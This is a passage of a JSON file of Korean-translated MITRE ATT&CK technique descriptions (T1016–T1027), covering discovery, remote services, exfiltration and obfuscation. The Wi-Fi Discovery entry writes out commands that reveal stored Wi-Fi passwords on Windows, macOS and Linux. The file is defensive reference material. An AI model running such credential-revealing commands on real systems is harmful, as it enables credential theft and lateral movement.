      "description": "적대적 행위자는 접근한 시스템의 네트워크 구성 및 설정에 대한 세부정보, 예를 들어 IP 주소 및/또는 MAC 주소를 찾거나 원격 시스템의 정보 탐색을 통해 이러한 정보를 수집할 수 있습니다. 이러한 정보를 수집하는 데 사용할 수 있는 여러 운영 체제 관리 유틸리티가 존재합니다. 예를 들어 [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102) 및 [route](https://attack.mitre.org/software/S0103) 등이 있습니다.\n\n적대적 행위자는 또한 네트워크 장치의 [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)를 활용하여 구성 및 설정에 대한 정보를 수집할 수 있습니다. 여기에는 구성된 인터페이스의 IP 주소 및 정적/동적 경로(예: <code>show ip route</code>, <code>show ip interface</code>)와 같은 정보가 포함됩니다. (출처: US-CERT-TA18-106A)(출처: Mandiant APT41 Global Intrusion)\n\n적대적 행위자는 [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016)에서 수집한 정보를 자동화된 탐색 중에 사용하여 후속 행동을 조정할 수 있습니다. 여기에는 대상 네트워크 내에서 특정 접근 권한을 결정하고 다음에 수행할 작업을 포함합니다.",
      "external_id": "T1016",
      "modified": "2023-07-28T14:40:54.580Z",
      "title": "System Network Configuration Discovery",
      "translated": true
    },
    {
      "description": "적대자는 손상된 시스템에서 인터넷 연결을 확인할 수 있습니다. 이는 자동 발견 과정에서 수행될 수 있으며, [Ping](https://attack.mitre.org/software/S0097), <code>tracert</code>, 및 웹사이트에 대한 GET 요청과 같은 여러 방법을 통해 이뤄질 수 있습니다.\n\n적대자는 이러한 요청에 대한 결과와 응답을 사용하여 시스템이 C2 서버와 통신할 수 있는지 여부를 판단한 후 연결을 시도할 수 있습니다. 또한, 결과는 경로, 리디렉터, 프록시 서버를 식별하는 데에도 사용될 수 있습니다.",
      "external_id": "T1016.001",
      "modified": "2021-03-25T17:03:26.632Z",
      "title": "Internet Connection Discovery",
      "translated": true
    },
    {
      "description": "공격자는 손상된 시스템에서 Wi-Fi 네트워크에 대한 정보(예: 네트워크 이름 및 비밀번호)를 검색할 수 있습니다. 공격자는 이 Wi-Fi 정보를 [계정 탐색](https://attack.mitre.org/techniques/T1087), [원격 시스템 탐색](https://attack.mitre.org/techniques/T1018) 및 기타 탐색 또는 [자격 증명 접근](https://attack.mitre.org/tactics/TA0006) 활동의 일환으로 사용할 수 있으며, 이는 지속적인 캠페인과 향후 캠페인을 지원하는 데 활용됩니다.\n\n공격자는 호스트에서 Wi-Fi 네트워크에 대한 다양한 정보를 수집할 수 있습니다. 예를 들어, Windows에서는 장치가 이전에 연결한 모든 Wi-Fi 네트워크의 이름과 비밀번호를 `netsh wlan show profiles`를 통해 열거할 수 있으며, `netsh wlan show profile “Wi-Fi name” key=clear`를 사용하여 해당 Wi-Fi 네트워크의 비밀번호를 확인할 수 있습니다.(출처: BleepingComputer Agent Tesla가 Wi-Fi 비밀번호 도용)(출처: Malware Bytes New AgentTesla 변종이 Wi-Fi 자격 증명을 도용)(출처: Check Point APT35 CharmPower 2022년 1월) 또한, `wlanAPI.dll` [네이티브 API](https://attack.mitre.org/techniques/T1106) 기능 호출을 통해 로컬에서 접근 가능한 Wi-Fi 네트워크의 이름 및 기타 세부 정보를 발견할 수 있습니다.(출처: Binary Defense Emotes Wi-Fi Spreader)\n\nLinux의 경우, 장치가 이전에 연결한 모든 Wi-Fi 네트워크의 이름과 비밀번호는 `/etc/NetworkManager/system-connections/` 하위의 파일에 저장되어 있을 수 있습니다.(출처: Windows/Linux에서 모든 연결된 네트워크의 Wi-Fi 비밀번호) macOS에서는 `security find-generic-password -wa wifiname` 명령어를 사용하여 알려진 Wi-Fi의 비밀번호를 확인할 수 있습니다(관리자 사용자 이름/비밀번호 필요).(출처: Mac에서 Wi-Fi 비밀번호 찾기)",
      "external_id": "T1016.002",
      "modified": "2023-10-05T11:35:30.887Z",
      "title": "Wi-Fi Discovery",
      "translated": true
    },
    {
      "description": "적대자는 기업 관리자들이 사용하는 애플리케이션 배포 시스템을 이용하여 네트워크 내의 시스템에 악성 소프트웨어를 배포할 수 있습니다. 이 작업을 수행하는 데 필요한 권한은 시스템 구성에 따라 다릅니다; 배포 서버에 직접 접근할 경우 로컬 자격 증명만으로도 충분할 수 있으며, 특정 도메인 자격 증명이 필요할 수도 있습니다. 그러나 시스템에 로그인하거나 소프트웨어 배포를 수행하기 위해서는 관리 계정이 필요할 수 있습니다.\n\n네트워크 전반 또는 기업 전체 소프트웨어 배포 시스템에 대한 접근은 적대자가 이러한 시스템에 연결된 모든 시스템에서 원격 코드 실행이 가능하게 합니다. 이러한 접근은 나중에 시스템 사이에 수평 이동을 하거나 정보를 수집하거나, 모든 엔드포인트의 하드 드라이브를 지우는 것과 같은 특정 효과를 유발하는 데 사용될 수 있습니다.",
      "external_id": "T1017",
      "modified": "2020-03-23T15:40:50.965Z",
      "title": "Application Deployment Software",
      "translated": true
    },
    {
      "description": "적대 세력은 현재 시스템에서의 측면 이동을 위해 IP 주소, 호스트 이름 또는 네트워크의 기타 논리적 식별자를 사용하여 다른 시스템 목록을 가져오려고 할 수 있습니다. 원격 액세스 도구 내에서 이러한 기능이 존재할 수 있으며, 운영 체제에서 사용할 수 있는 유틸리티도 사용될 수 있습니다. 예를 들어, [Ping](https://attack.mitre.org/software/S0097) 또는 <code>net view</code>와 같은 [Net](https://attack.mitre.org/software/S0039) 명령을 활용할 수 있습니다.\n\n또한, 적대 세력은 로컬 호스트 파일(ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> 또는 <code>/etc/hosts</code>)의 데이터를 분석하거나 로컬 [Arp](https://attack.mitre.org/software/S0099) 캐시 항목과 같은 기타 수동 수단을 통해 환경 내 원격 시스템의 존재를 파악할 수 있습니다.\n\n적대 세력은 네트워크 인프라 탐색을 목표로 삼을 수도 있으며, 네트워크 장치에서 [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) 명령을 활용하여 네트워크 내 시스템에 대한 상세 정보를 수집할 수 있습니다(예: <code>show cdp neighbors</code>, <code>show arp</code>). (인용: US-CERT-TA18-106A) (인용: CISA AR21-126A FIVEHANDS 2021년 5월)",
      "external_id": "T1018",
      "modified": "2023-08-14T19:08:59.741Z",
      "title": "Remote System Discovery",
      "translated": true
    },
    {
      "description": "BIOS(기본 입력/출력 시스템) 및 통합 확장 펌웨어 인터페이스(UEFI) 또는 확장 가능 펌웨어 인터페이스(EFI)는 운영 체제와 컴퓨터 하드웨어 간의 소프트웨어 인터페이스로 작동하는 시스템 펌웨어의 예입니다. (출처: 위키백과 BIOS) (출처: 위키백과 UEFI) (출처: UEFI에 대하여)\n\nBIOS 및 (U)EFI와 같은 시스템 펌웨어는 컴퓨터의 기능을 뒷받침하며, 적대자가 악의적인 활동을 수행하거나 돕기 위해 수정할 수 있습니다. 시스템 펌웨어를 덮어쓸 수 있는 기능이 존재하여, 정교한 적대자에게는 탐지가 어려운 시스템에서 지속성을 유지하기 위한 수단으로 악성 펌웨어 업데이트를 설치할 수 있는 방법을 제공할 수 있습니다.",
      "external_id": "T1019",
      "modified": "2020-03-30T19:16:29.473Z",
      "title": "System Firmware",
      "translated": true
    },
    {
      "description": "적대자는 수집 단계에서 수집된 민감한 문서와 같은 데이터를 자동화된 처리를 통해 외부로 유출할 수 있습니다. (출처: ESET Gamaredon 2020년 6월)\n\n자동화된 유출이 사용될 경우, C2 채널을 통한 유출([Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041))과 대체 프로토콜을 통한 유출([Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048))과 같은 다른 유출 기술도 적용될 가능성이 높습니다.",
      "external_id": "T1020",
      "modified": "2024-01-24T00:04:01.066Z",
      "title": "Automated Exfiltration",
      "translated": true
    },
    {
      "description": "적대자는 손상된 인프라를 통해 데이터 유출을 자동화하기 위해 트래픽 미러링을 활용할 수 있습니다. 트래픽 미러링은 일부 장치에서 제공되는 기본 기능으로, 네트워크 분석에 자주 사용됩니다. 예를 들어, 장치는 네트워크 트래픽을 네트워크 분석기 또는 기타 모니터링 장치에 대한 하나 이상의 대상으로 전달하도록 설정할 수 있습니다. (출처: Cisco Traffic Mirroring)(출처: Juniper Traffic Mirroring)\n\n적대자는 트래픽 미러링을 악용하여 그들이 제어하는 다른 인프라를 통해 네트워크 트래픽을 미러링하거나 리디렉션할 수 있습니다. 네트워크 장치의 악의적인 수정으로 트래픽 리디렉션을 가능하게 할 수 있으며, 이는 [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) 또는 [Patch System Image](https://attack.mitre.org/techniques/T1601/001)를 통해 이루어질 수 있습니다. (출처: US-CERT-TA18-106A)(출처: Cisco Blog Legacy Device Attacks)\n\n많은 클라우드 기반 환경에서도 트래픽 미러링을 지원합니다. 예를 들어, AWS Traffic Mirroring, GCP Packet Mirroring 및 Azure vTap은 사용자가 트래픽을 수집할 특정 인스턴스와 수집된 트래픽을 전송할 특정 대상을 정의할 수 있게 해줍니다. (출처: AWS Traffic Mirroring)(출처: GCP Packet Mirroring)(출처: Azure Virtual Network TAP)\n\n적대자는 적대자의 목표와 목적에 따라 [네트워크 스니핑](https://attack.mitre.org/techniques/T1040), [입력 캡처](https://attack.mitre.org/techniques/T1056), 또는 [중간자 공격](https://attack.mitre.org/techniques/T1557)과 함께 트래픽 중복을 사용할 수 있습니다.",
      "external_id": "T1020.001",
      "modified": "2024-10-15T16:08:13.273Z",
      "title": "Traffic Duplication",
      "translated": true
    },
    {
      "description": "적대 세력은 [유효 계정](https://attack.mitre.org/techniques/T1078)을 사용하여 telnet, SSH 및 VNC와 같은 원격 연결을 허용하는 서비스에 로그인할 수 있습니다. 이후 적대 세력은 로그인한 사용자의 권한으로 행동을 수행할 수 있습니다.\n\n기업 환경에서는 서버와 워크스테이션이 도메인으로 조직할 수 있습니다. 도메인은 중앙 집중식 신원 관리를 제공하여 사용자가 전체 네트워크에 걸쳐 하나의 자격 증명 세트를 사용하여 로그인할 수 있게 합니다. 만약 적대 세력이 유효한 도메인 자격 증명 세트를 얻는다면, 안전한 셸(SSH)이나 원격 데스크톱 프로토콜(RDP)과 같은 원격 접속 프로토콜을 사용하여 여러 다른 장치에 로그인할 수 있습니다. (참조: SSH Secure Shell)(참조: TechNet Remote Desktop Services) 그들은 또한 자신의 신원을 도메인에 연계한 접근 가능한 SaaS 또는 IaaS 서비스에 로그인할 수 있습니다.\n\n정상적인 애플리케이션(예: [소프트웨어 배포 도구](https://attack.mitre.org/techniques/T1072) 및 기타 관리 프로그램)은 [원격 서비스](https://attack.mitre.org/techniques/T1021)를 사용하여 원격 호스트에 접근할 수 있습니다. 예를 들어, macOS의 Apple Remote Desktop(ARD)은 원격 관리를 위해 사용되는 기본 소프트웨어입니다. ARD는 화면과 제어 버퍼를 보내기 위해 [VNC](https://attack.mitre.org/techniques/T1021/005)와 안전한 파일 전송을 위해 [SSH](https://attack.mitre.org/techniques/T1021/004)를 포함한 다양한 프로토콜을 활용합니다. (참조: 원격 관리 MDM macOS)(참조: Kickstart Apple Remote Desktop 명령어)(참조: Apple Remote Desktop Admin Guide 3.3) 적대 세력은 ARD와 같은 애플리케이션을 악용하여 원격 코드 실행을 수행하고 수평 이동을 할 수 있습니다. macOS 10.14 이전 버전에서는 적대 세력이 SSH 세션을 ARD 세션으로 승격시켜 사용자 상호작용 없이 TCC(투명성, 동의 및 제어) 프롬프트를 수락하고 데이터에 접근할 수 있게 됩니다. (참조: FireEye 2019 Apple Remote Desktop)(참조: Lockboxx ARD 2019)(참조: Kickstart Apple Remote Desktop 명령어)",
      "external_id": "T1021",
      "modified": "2024-03-01T15:35:38.299Z",
      "title": "Remote Services",
      "translated": true
    },
    {
      "description": "위협 행위자는 [유효 계정](https://attack.mitre.org/techniques/T1078)을 사용하여 원격 데스크톱 프로토콜(RDP)을 이용해 컴퓨터에 로그인할 수 있습니다. 그런 다음 위협 행위자는 로그인된 사용자로서 작업을 수행할 수 있습니다.\n\n원격 데스크톱은 운영 체제에서 일반적으로 제공되는 기능입니다. 이를 통해 사용자는 원격 시스템의 데스크톱 그래픽 사용자 인터페이스와 인터랙티브 세션에 로그인할 수 있습니다. Microsoft는 원격 데스크톱 프로토콜(RDP)의 구현을 원격 데스크톱 서비스(RDS)라고 합니다. (출처: TechNet 원격 데스크톱 서비스)\n\n위협 행위자는 RDP/RDS를 통해 원격 시스템에 연결하여 액세스를 확장할 수 있습니다. 이 서비스가 활성화되어 있고 알려진 자격 증명으로 계정에 대한 접근을 허용하는 경우 더욱 그렇습니다. 위협 행위자는 RDP와 함께 Credential Access 기법을 사용하여 사용할 자격 증명을 획득할 가능성이 높습니다. 또한, 위협 행위자는 지속성을 위해 [접근성 기능](https://attack.mitre.org/techniques/T1546/008) 또는 [터미널 서비스 DLL](https://attack.mitre.org/techniques/T1505/005)을 RDP와 함께 사용할 수 있습니다. (출처: Alperovitch Malware)",
      "external_id": "T1021.001",
      "modified": "2023-08-07T14:23:30.265Z",
      "title": "Remote Desktop Protocol",
      "translated": true
    },
    {
      "description": "공격자는 [유효 계정](https://attack.mitre.org/techniques/T1078)을 사용하여 서버 메시 블록(SMB)을 통해 원격 네트워크 공유와 상호작용할 수 있습니다. 그 후 공격자는 로그인된 사용자로서 행동을 수행할 수 있습니다.\n\nSMB는 동일한 네트워크 또는 도메인에 있는 Windows 시스템을 위한 파일, 프린터 및 직렬 포트 공유 프로토콜입니다. 공격자는 파일 공유와 상호작용하기 위해 SMB를 사용할 수 있으며, 이를 통해 네트워크 전반에 걸쳐 수평 이동이 가능합니다. Linux 및 macOS의 SMB 구현은 일반적으로 Samba를 사용합니다.\n\nWindows 시스템에는 관리자가 아닌 사용자에게는 접근이 불가능한 숨겨진 네트워크 공유가 있으며, 이는 원격 파일 복사 및 기타 관리 작업의 기능을 제공합니다. 예로는 `C$`, `ADMIN$`, 및 `IPC$`와 같은 네트워크 공유가 있습니다. 공격자는 이 기술을 관리자 수준의 [유효 계정](https://attack.mitre.org/techniques/T1078)과 함께 사용하여 SMB를 통해 네트워크에 연결된 시스템에 원격으로 접근하고,(인용: 위키피디아 서버 메시지 블록) 원격 프로시저 호출(RPC)을 통해 시스템과 상호작용하며,(인용: TechNet RPC) 파일을 전송하고, 전송된 바이너리를 원격 실행을 통해 실행할 수 있습니다. SMB/RPC의 인증된 세션에 의존하는 예시 실행 기술로는 [예약 작업/작업](https://attack.mitre.org/techniques/T1053), [서비스 실행](https://attack.mitre.org/techniques/T1569/002), 및 [Windows 관리 센서](https://attack.mitre.org/techniques/T1047) 등이 있습니다. 공격자는 또한 NTLM 해시를 사용하여 [해시 전달](https://attack.mitre.org/techniques/T1550/002)이 가능하며 특정 구성 및 패치 수준의 시스템에서 관리 공유에 접근할 수 있습니다.(인용: 마이크로소프트 관리 공유)",
      "external_id": "T1021.002",
      "modified": "2023-07-28T17:34:51.250Z",
      "title": "SMB/Windows Admin Shares",
      "translated": true
    },
    {
      "description": "적대자는 [유효한 계정](https://attack.mitre.org/techniques/T1078)을 사용하여 분산 구성 요소 개체 모델(DCOM)을 활용하여 원격 머신과 상호작용할 수 있습니다. 이후 적대자는 로그인한 사용자로서 작업을 수행할 수 있습니다.\n\nWindows 구성 요소 개체 모델(COM)은 소프트웨어 개체 간의 상호작용을 가능하게 하는 기본 Windows 응용 프로그램 프로그래밍 인터페이스(API)의 구성 요소로, 하나 이상의 인터페이스를 구현하는 실행 가능한 코드입니다. COM을 통해 클라이언트 개체는 서버 개체의 메서드를 호출할 수 있으며, 서버 개체는 일반적으로 동적 연결 라이브러리(DLL) 또는 실행 파일(EXE)입니다. 분산 COM(DCOM)은 원격 프로시저 호출(RPC) 기술을 사용하여 COM의 기능을 로컬 컴퓨터를 넘어 확장하는 투명한 미들웨어입니다. (인용: Fireeye Hunting COM 2019년 6월)(인용: Microsoft COM)\n\n로컬 및 원격 서버 COM 개체와 상호작용할 수 있는 권한은 레지스트리의 접근 제어 목록(ACL)에 의해 지정됩니다. (인용: Microsoft Process Wide Com Keys) 기본적으로, 관리자만이 DCOM을 통해 원격으로 COM 개체를 활성화하고 시작할 수 있습니다. (인용: Microsoft COM ACL)\n\n적절한 권한을 가진 사용자의 맥락에서 운영되는 적대자는 DCOM을 통해 원격으로 임의의 코드를 실행하거나 Office 응용 프로그램(Citation: Enigma Outlook DCOM Lateral Movement 2017년 11월) 및 불안전한 메서드를 포함하는 기타 Windows 개체(Citation: Enigma MMC20 COM 2017년 1월)(Citation: Enigma DCOM Lateral Movement 2017년 1월)를 통해 직접적 쉘코드 실행을 얻을 수 있습니다. DCOM은 기존 문서에서 매크로를 실행할 수도 있습니다(Citation: Enigma Excel DCOM 2017년 9월) 및 Microsoft Office 응용 프로그램의 COM 생성 인스턴스를 통해 [동적 데이터 교환](https://attack.mitre.org/techniques/T1559/002) (DDE) 실행을 직접 호출할 수 있습니다(Citation: Cyberreason DCOM DDE Lateral Movement 2017년 11월), 악성 문서의 필요성을 우회할 수 있습니다. DCOM은 [Windows 관리 도구](https://attack.mitre.org/techniques/T1047)와 원격으로 상호작용하는 방법으로도 사용될 수 있습니다. (인용: MSDN WMI)",
      "external_id": "T1021.003",
      "modified": "2023-08-11T20:21:55.610Z",
      "title": "Distributed Component Object Model",
      "translated": true
    },
    {
      "description": "위협 행위자는 [유효한 계정](https://attack.mitre.org/techniques/T1078)을 사용하여 Secure Shell(SSH)을 통해 원격 머신에 로그인할 수 있습니다. 이후 위협 행위자는 로그인한 사용자로서 작업을 수행할 수 있습니다.\n\nSSH는 권한이 부여된 사용자가 다른 컴퓨터에서 원격 셸을 열 수 있도록 허용하는 프로토콜입니다. 많은 리눅스 및 macOS 버전은 기본적으로 SSH가 설치되어 있지만, 일반적으로 사용자가 활성화할 때까지 비활성화되어 있습니다. SSH 서버는 표준 비밀번호 인증 또는 비밀번호 대신 또는 추가로 공개-개인 키 쌍을 사용할 수 있도록 구성할 수 있습니다. 이 인증 시나리오에서 사용자의 공개 키는 서버를 실행하는 컴퓨터의 특별한 파일에 있어야 하며, 이 파일에는 해당 사용자로 로그인할 수 있는 키 쌍이 나열되어 있습니다.",
      "external_id": "T1021.004",
      "modified": "2023-08-11T20:24:03.069Z",
      "title": "SSH",
      "translated": true
    },
    {
      "description": "위협 행위자는 [유효 계정(Valid Accounts)](https://attack.mitre.org/techniques/T1078)를 사용하여 가상 네트워크 컴퓨팅(VNC)을 통해 원격으로 머신을 제어할 수 있습니다. VNC는 RFB(“원격 프레임 버퍼”) 프로토콜을 사용하는 플랫폼 독립적인 데스크톱 공유 시스템으로, 사용자가 네트워크를 통해 화면, 마우스 및 키보드 입력을 중계하여 다른 컴퓨터의 디스플레이를 원격으로 제어할 수 있게 합니다.(참고: 원격 프레임 버퍼 프로토콜)\n\nVNC는 리소스 공유 소프트웨어가 아닌 화면 공유 소프트웨어로서 [원격 데스크톱 프로토콜(Protocol)](https://attack.mitre.org/techniques/T1021/001)과는 다릅니다. 기본적으로 VNC는 시스템의 인증을 사용하지만, VNC에 특정한 자격 증명을 사용하도록 설정할 수도 있습니다.(참고: macOS VNC 원격 데스크톱 소프트웨어)(참고: VNC 인증)\n\n위협 행위자는 로그인한 사용자로서 문서를 열고, 파일을 다운로드하며, 임의의 명령을 실행하는 등 악의적인 작업을 수행하기 위해 VNC를 악용할 수 있습니다. 위협 행위자는 VNC를 사용하여 시스템을 원격으로 제어하고 모니터링하며, 데이터를 수집하고 네트워크 내 다른 시스템으로 이동할 수 있는 정보를 수집할 수 있습니다. 특정 VNC 라이브러리/구현은 또한 무차별 대입 공격과 메모리 사용 악용에 취약한 경우가 있습니다.(참고: VNC 탈취)(참고: 인증 없이 macOS 루트 VNC 로그인)(참고: VNC 취약점)(참고: 공격 보안 VNC 인증 검사)(참고: VNC 서버 공격 PentestLab)(참고: 하바나 인증 버그)",
      "external_id": "T1021.005",
      "modified": "2024-09-12T15:20:07.264Z",
      "title": "VNC",
      "translated": true
    },
    {
      "description": "공격자는 [유효한 계정](https://attack.mitre.org/techniques/T1078)을 사용하여 Windows 원격 관리(WinRM)를 통해 원격 시스템과 상호 작용할 수 있습니다. 이후 공격자는 로그인한 사용자로서의 행동을 수행할 수 있습니다.\n\nWinRM은 사용자가 원격 시스템과 상호작용할 수 있도록 해주는 Windows 서비스 및 프로토콜의 이름입니다(예: 실행 파일 실행, 레지스트리 수정, 서비스 수정). (출처: Microsoft WinRM) `winrm` 명령어 또는 PowerShell과 같은 여러 프로그램을 통해 호출될 수 있습니다. (출처: Jacobsen 2014) WinRM은 [Windows 관리 도구](https://attack.mitre.org/techniques/T1047)와 원격으로 상호작용하는 방법으로 사용될 수 있습니다. (출처: MSDN WMI)",
      "external_id": "T1021.006",
      "modified": "2024-09-12T15:28:23.398Z",
      "title": "Windows Remote Management",
      "translated": true
    },
    {
      "description": "공격자는 손상된 환경 내에서 [유효 계정](https://attack.mitre.org/techniques/T1078)을 사용하여 접근 가능한 클라우드 서비스에 로그인할 수 있으며, 이는 온프레미스 사용자 ID와 동기화되거나 연합되어 있습니다. 공격자는 로그인한 사용자로서 관리자 작업을 수행하거나 클라우드 호스팅 리소스에 접근할 수 있습니다.\n\n많은 기업들은 중앙에서 관리되는 사용자 ID를 클라우드 서비스로 연합하여 사용자가 도메인 자격증명을 사용하여 클라우드 제어판에 접근할 수 있도록 하고 있습니다. 마찬가지로, 공격자는 웹 콘솔이나 클라우드 명령줄 인터페이스(CLI)를 통해 사용할 수 있는 클라우드 서비스에 연결할 수 있습니다(e.g., [클라우드 API](https://attack.mitre.org/techniques/T1059/009)). Azure PowerShell의 <code>Connect-AZAccount</code>, Microsoft Graph PowerShell의 <code>Connect-MgGraph</code>, Google Cloud CLI의 <code>gcloud auth login</code>과 같은 명령을 사용할 수 있습니다.\n\n일부 경우에 공격자는 사용자 이름과 비밀번호 대신 [애플리케이션 액세스 토큰](https://attack.mitre.org/techniques/T1550/001)을 통해 이러한 서비스에 인증할 수 있습니다.",
      "external_id": "T1021.007",
      "modified": "2024-10-15T15:52:47.255Z",
      "title": "Cloud Services",
      "translated": true
    },
    {
      "description": "적대적인 행위자들은 [유효 계정(Valid Accounts)](https://attack.mitre.org/techniques/T1078)를 이용하여 클라우드 호스팅 컴퓨팅 인프라에 직접 로그인할 수 있습니다. 많은 클라우드 제공업체는 [Cloud API](https://attack.mitre.org/techniques/T1059/009)를 통해 접근할 수 있는 가상 인프라에 대한 상호작용 연결을 제공합니다. 예를 들어, Azure Serial Console(Citation: Azure Serial Console), AWS EC2 Instance Connect(Citation: EC2 Instance Connect)(Citation: lucr-3: Getting SaaS-y in the cloud), 및 AWS System Manager(Citation: AWS System Manager)와 같은 방법이 있습니다.\n\n이러한 연결에 대한 인증 방법으로는 비밀번호, 애플리케이션 접근 토큰 또는 SSH 키가 포함될 수 있습니다. 이러한 클라우드 네이티브 방법은 기본적으로 호스트에서 SYSTEM 또는 루트 수준의 특권 접근을 허용할 수 있습니다.\n\n적대적인 행위자들은 이러한 클라우드 네이티브 방법을 이용하여 가상 인프라에 직접 접근하고 환경 내에서 이동할 수 있습니다(Citation: SIM Swapping and Abuse of the Microsoft Azure Serial Console). 이러한 연결은 일반적으로 VM에 대한 직접 콘솔 접근을 제공하며, 스크립트 실행(i.e., [Cloud Administration Command](https://attack.mitre.org/techniques/T1651))이 아닌 경우가 많습니다.",
      "external_id": "T1021.008",
      "modified": "2023-10-27T18:32:11.219Z",
      "title": "Direct Cloud VM Connections",
      "translated": true
    },
    {
      "description": "데이터는 탐지를 회피하거나 방어자가 검토할 때 유출을 덜 눈에 띄게 만들기 위해 유출되기 전에 암호화됩니다. 암호화는 데이터 자체에 대해 유틸리티, 프로그래밍 라이브러리 또는 사용자 정의 알고리즘을 사용하여 수행되며, 이는 명령 및 제어 또는 파일 전송 프로토콜에서 수행되는 암호화와는 별개로 간주됩니다. 파일을 암호화할 수 있는 일반적인 파일 아카이브 형식으로는 RAR 및 zip이 있습니다.\n\n네트워크 밖으로 정보를 전송하기 위해 [C2 채널을 통한 유출](https://attack.mitre.org/techniques/T1041) 및 [대체 프로토콜을 통한 유출](https://attack.mitre.org/techniques/T1048)과 같은 다른 유출 기술도 적용될 가능성이 높습니다.",
      "external_id": "T1022",
      "modified": "2020-03-30T03:10:12.750Z",
      "title": "Data Encrypted",
      "translated": true
    },
    {
      "description": "바로가기를 사용하거나 심볼릭 링크는 다른 파일이나 프로그램을 참조하는 방법으로, 바로가기를 클릭하거나 시스템 시작 프로세스에 의해 실행될 때 해당 파일이나 프로그램이 열리거나 실행됩니다. 공격자는 이러한 바로가기를 이용하여 도구를 실행하고 지속성을 유지할 수 있습니다. 그들은 정당한 프로그램처럼 보이게 하기 위해 [위장(Masquerading)](https://attack.mitre.org/techniques/T1036)을 활용하여 새로운 바로가기를 생성할 수 있습니다. 또한, 공격자는 대상 경로를 수정하거나 기존의 바로가기를 완전히 교체하여 정당한 프로그램 대신 자신의 도구가 실행되도록 할 수 있습니다.",
      "external_id": "T1023",
      "modified": "2020-01-24T19:36:41.805Z",
      "title": "Shortcut Modification",
      "translated": true
    },
    {
      "description": "위협 행위자는 커맨드 및 제어 트래픽을 숨기기 위해 사용자 정의 암호화 프로토콜이나 알고리즘을 사용할 수 있습니다. 평문에 고정된 키를 XOR하여 단순한 방식으로 처리하면 매우 약한 암호문이 생성됩니다.\n\n사용자 정의 암호화 방식은 그 정교함이 다양할 수 있습니다. 악성 코드 샘플에 대한 분석 및 역설계만으로도 사용된 알고리즘과 암호화 키를 발견할 수 있습니다.\n\n일부 위협 행위자는 알려진 구현 라이브러리를 사용하는 대신 잘 알려진 암호화 알고리즘의 자신의 버전을 구현하려고 시도할 수도 있으며, 이는 의도치 않은 오류를 초래할 수 있습니다. (출처: F-Secure Cosmicduke)",
      "external_id": "T1024",
      "modified": "2021-07-20T21:57:36.046Z",
      "title": "Custom Cryptographic Protocol",
      "translated": true
    },
    {
      "description": "공격자는 그들이 침투한 컴퓨터에서 연결된 이동식 미디어를 검색하여 관심 있는 파일을 찾을 수 있습니다. 민감한 데이터는 침해된 시스템에 연결된 어떠한 이동식 미디어(광디스크 드라이브, USB 메모리 등)에서도 수집될 수 있으며, 이는 데이터 유출 전에 발생합니다. 인터랙티브 명령 셸이 사용되고 있을 수 있으며, [cmd](https://attack.mitre.org/software/S0106) 내에서 일반적인 기능이 정보를 수집하는 데 사용될 수 있습니다.\n\n일부 공격자는 이동식 미디어에 대해 [자동화된 수집](https://attack.mitre.org/techniques/T1119)을 사용할 수도 있습니다.",
      "external_id": "T1025",
      "modified": "2024-10-15T16:30:50.936Z",
      "title": "Data from Removable Media",
      "translated": true
    },
    {
      "description": "**이 기술은 더 이상 사용되지 않으며 중단되었습니다.**\n\n일부 적대자는 서로 다른 프로토콜 간의 통신을 분리할 수 있습니다. 들어오는 명령 및 제어를 위한 프로토콜과 나가는 데이터를 위한 다른 프로토콜을 설정하여 특정 방화벽 제한을 우회할 수 있습니다. 이 분리는 무작위로 이루어질 수도 있으며, 단일 통신에서 데이터 임계값 경고를 피하기 위해서일 수 있습니다.",
      "external_id": "T1026",
      "modified": "2020-03-30T13:59:11.272Z",
      "title": "Multiband Communication",
      "translated": true
    },
    {
      "description": "적대 세력은 시스템이나 전송 중인 파일의 내용을 암호화, 인코딩 또는 기타 방법으로 혼란스럽게 하여 실행 파일이나 파일을 발견하거나 분석하기 어렵게 만들려고 할 수 있습니다. 이는 방어를 피하기 위해 다양한 플랫폼과 네트워크에서 사용할 수 있는 일반적인 행동입니다.\n\n페이로드는 탐지를 피하기 위해 압축되거나 아카이브되거나 암호화될 수 있습니다. 이러한 페이로드는 초기 접근 또는 나중에 탐지를 완화하는 데 사용될 수 있습니다. 때때로 사용자의 행동이 필요하여 [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)를 열기 위한 [User Execution](https://attack.mitre.org/techniques/T1204)을 요구할 수 있습니다. 사용자는 적대 세력이 제공한 암호로 보호된 압축/암호화된 파일을 열기 위해 암호를 입력해야 할 수도 있습니다. (인용: Volexity PowerDuke, 2016년 11월) 적대 세력은 또한 JavaScript와 같은 압축되거나 아카이브된 스크립트를 사용할 수도 있습니다.\n\n파일의 일부는 명백한 문자열을 숨기기 위해 인코딩될 수도 있습니다. 이는 수비수가 발견하는 데 도움이 됩니다. (인용: Linux/Cdorked.A We Live Security 분석) 페이로드는 또한 별도의, 겉보기에는 무해한 파일로 분할되어 재조립될 때만 악의적인 기능을 드러낼 수 있습니다. (인용: Carbon Black Obfuscation, 2016년 9월)\n\n적대 세력은 [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010)을 악용하여 페이로드에서 실행된 명령이나 [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)를 통해 직접 실행된 명령을 모호하게 만들 수 있습니다. 환경 변수, 별칭, 문자 및 기타 플랫폼/언어별 구문을 사용하여 서명 기반 탐지 및 응용 프로그램 제어 메커니즘을 피할 수 있습니다. (인용: FireEye Obfuscation, 2017년 6월) (인용: FireEye Revoke-Obfuscation, 2017년 7월) (인용: PaloAlto EncodedCommand, 2017년 3월)",
      "external_id": "T1027",
      "modified": "2024-04-16T12:27:18.945Z",
      "title": "Obfuscated Files or Information",
      "translated": true
    },
    {
